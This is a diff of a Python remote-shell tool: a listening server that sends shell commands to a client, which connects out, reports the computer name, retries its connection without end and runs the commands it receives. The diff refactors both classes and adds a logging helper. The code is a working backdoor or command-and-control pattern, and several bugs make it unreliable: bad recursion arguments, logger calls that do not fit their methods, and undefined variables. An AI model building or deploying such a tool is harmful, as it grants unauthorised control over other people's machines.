@@ -1,41 +1,40 @@
-import sys, os, os.path
-import socket, subprocess, re
+import sys, os, os.path, logging
+import socket, subprocess, re, time
 
 class Server:
-    
-    host = '0.0.0.0'
-    port = 58777
-    s = None
-    max_bind_retries = 10
-    conn = None
-    addr = None
-    hostname = None
-    
-    def create(self, port):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.port = port
 
-    def bind(self, current_try=0):
+    def __init__(self, host = '0.0.0.0', port = 58777, attempts = 10):
+        self.host = host
+        self.port = port
+        self.attempts = attempts
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.conn = None
+        self.addr = None
+        self.hostname = None
+        self.log = Logger('server', output='file,print')
+
+    def listen(self, attempt=1):
         try:
-            print("[*] Listening on Port %s (Attempt %d)" % (self.port, current_try))
+            self.log.info("Listening on Port %s (Attempt %d)" % (self.port, attempt))
             self.s.bind((self.host, self.port))
             self.s.listen(1)
         except socket.error as msg:
-            print('[-] Socket Binding Error:', msg[0], file=sys.stderr)
-            if current_try < self.max_bind_retries: 
-                print('Retrying...', file=sys.stderr)
-                self.bind(current_try + 1)
+            self.log.error('Socket Binding Error:', msg[0], file=sys.stderr)
+            if attempt < self.attempts: 
+                self.log.info('Retrying...', file=sys.stderr)
+                self.listen(attempt= + 1)
 
     def accept(self):
         try:
             self.conn, self.addr = self.s.accept()
-            print('[!] Session Opened at %s:%s' % (self.addr[0], self.addr[1]))
+            self.log.success('Session Opened at %s:%s' % (self.addr[0], self.addr[1]))
             self.hostname = self.conn.recv(1024)
-            self.menu()
+            self.prompt()
+            self.log.warning('Session Closed at %s:%s' % (self.addr[0], self.addr[1]))
         except socket.error as msg:
-            print('[-] Socket Accepting Error:', msg[0], file=sys.stderr)
+            self.log.error('Socket Accepting Error:', msg[0], file=sys.stderr)            
 
-    def menu(self):
+    def prompt(self):
         while True:
             cmd = input(str(self.addr[0]) + '@' + str(self.hostname) + '>> ')
             if cmd == 'quit':
@@ -49,18 +48,21 @@ class Server:
 
 class Client:
 
-    s = None
-
-    def connect(self, host, port):
+    def __init__(self, host, port = 58777):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        port = int(port)
+        self.host = host
+        self.port = int(port)
+        self.log = Logger('client', output='file,print')
+        self.log.info('Connecting to %s:%s' % (self.host, self.port))   
+
+    def connect(self):
         try:
-            print('[*] Connecting to %s:%s' % (host, port))
             self.s.connect((host, port))
-            print('[!] Connection Established')
+            self.log.success('Connection Established')
             self.s.send(os.environ['COMPUTERNAME'])
         except:
-            print('[-] Failed to Establish Connection', file=sys.stderr)
+            time.sleep(2)
+            self.connect()
 
     def receive(self):
         received = self.s.recv(1024)
@@ -80,7 +82,7 @@ class Client:
             else:
                 output = '[!] Arguments must follow "shell"'
         else:
-            output = '[-] Unknow Command. Expecting "quit" or "shell <cmd>" (e.g. "shell dir")'
+            output = '[x] Unknow Command. Expecting "quit" or "shell <cmd>" (e.g. "shell dir")'
         self.send(output)
 
     def send(self, output):
@@ -88,4 +90,45 @@ class Client:
         self.receive()
 
     def stop():
+        self.log.warning('Terminating Connection to %s:%s' % (host, port))
         self.s.close()
+
+class Logger():
+
+    def __init__(self, name, level = logging.INFO, output = 'file'):
+        self.logger  = logging.getLogger(name)
+        self.logger.setLevel(level)
+        self.output = [mode.strip() for mode in output.split(',')]
+
+        if 'file' in self.output:
+            self.handler = logging.FileHandler(f'{name}.log')
+            self.handler.setLevel(level)
+
+            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            self.handler.setFormatter(formatter)
+
+            self.logger.addHandler(self.handler)
+
+    def info(self, msg):
+        self.logger.info(msg)
+        if 'print' in self.output:
+            sym = '*'
+            print(f'[{sym}] {msg}')
+
+    def success(self, msg):
+        self.logger.success(msg)
+        if 'print' in self.output:
+            sym = chr(10004)
+            print(f'[{sym}] {msg}')
+
+    def error(self, msg):
+        self.logger.error(msg)
+        if 'print' in self.output:
+            sym = chr(10006)
+            print(f'[{sym}] {msg}')
+
+    def warning(self, msg):
+        self.logger.warning(msg)
+        if 'print' in self.output:
+            sym = '!'
+            print(f'[{sym}] {msg}')
